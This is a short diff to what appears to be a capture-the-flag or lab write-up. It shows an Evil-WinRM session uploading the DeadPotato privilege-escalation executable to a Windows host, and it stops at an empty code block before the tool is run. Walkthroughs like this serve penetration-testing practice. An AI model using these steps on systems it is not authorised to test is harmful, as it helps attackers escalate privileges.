@@ -729,4 +729,21 @@ So ill use DeadPotato to exploit this!
 
 https://github.com/lypd0/DeadPotato
 
-Ill download the latest release then 
+Ill download the latest release then upload it via evil-winrm
+
+```python
+*Evil-WinRM* PS C:\Users\sharedadmin\Documents> upload DeadPotato-NET4.exe
+                                        
+Info: Uploading /home/kali/hsm/fragments/DeadPotato-NET4.exe to C:\Users\sharedadmin\Documents\DeadPotato-NET4.exe
+                                        
+Data: 3158696 bytes of 3158696 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\sharedadmin\Documents>
+```
+
+Now its uploaded i can run it
+
+```python
+
+```
